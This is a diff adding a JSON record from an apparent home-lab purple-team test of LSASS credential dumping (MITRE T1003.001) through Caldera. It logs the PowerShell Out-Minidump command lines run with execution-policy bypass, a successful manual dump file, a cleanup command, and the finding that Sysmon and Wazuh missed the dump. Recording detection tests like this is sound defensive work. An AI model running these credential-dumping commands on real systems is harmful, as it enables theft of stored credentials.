@@ -1,0 +1,55 @@
+{
+  "technique": "T1003.001",
+  "date": "2026-05-19",
+  "agent": {
+    "name": "Win10-Victim",
+    "ip": "192.168.56.101",
+    "id": "001"
+  },
+  "execution_method": "MITRE Caldera (Out-Minidump.ps1) + manual PowerShell fallback",
+  "caldera": {
+    "operation": "T1003-LSASS-Dump",
+    "ability_name": "Dump LSASS.exe Memory using Out-Minidump.ps1",
+    "ability_id": "60bb6f8468aa98b75be2521861a164d5",
+    "agent_paw": "wbtfwr",
+    "agent_location": "C:\\Users\\Public\\splunkd.exe",
+    "tactic": "credential-access",
+    "technique_id": "T1003.001",
+    "delegated_timestamp": "2026-05-19T10:47:59Z",
+    "collected_timestamp": "2026-05-19T10:48:07Z",
+    "exit_code": 1,
+    "stderr": "The Try statement is missing its Catch or Finally block — IWR blocked, VM has no internet",
+    "cleanup_command": "Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore",
+    "cleanup_exit_code": 0
+  },
+  "sysmon_eid1": {
+    "eventID": "1",
+    "timestamp": "2026-05-19T11:48:07",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "commandLine": "powershell.exe -ExecutionPolicy Bypass -C \"get-process lsass | Out-Minidump\"",
+    "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "user": "WIN10-VICTIM\\walid",
+    "channel": "Microsoft-Windows-Sysmon/Operational"
+  },
+  "sysmon_eid10": {
+    "eventID": "10",
+    "status": "NOT CAPTURED",
+    "reason": "SwiftOnSecurity Sysmon config has no ProcessAccess rules for lsass.exe. Zero EID 10 events in entire log. Will be fixed in Week 3."
+  },
+  "manual_execution": {
+    "command": ". $env:TEMP\\Out-Minidump.ps1; Get-Process lsass | Out-Minidump -DumpFilePath $env:TEMP",
+    "dump_file": "%TEMP%\\lsass_624.dmp",
+    "dump_size_bytes": 53714305,
+    "lsass_pid": 624,
+    "result": "success"
+  },
+  "wazuh": {
+    "primary_alert": "NONE — dump execution not detected",
+    "secondary_alert": {
+      "rule_id": "92021",
+      "rule_description": "Powershell was used to delete files or directories",
+      "rule_level": 3,
+      "note": "Cleanup command detected but primary attack missed"
+    }
+  }
+}
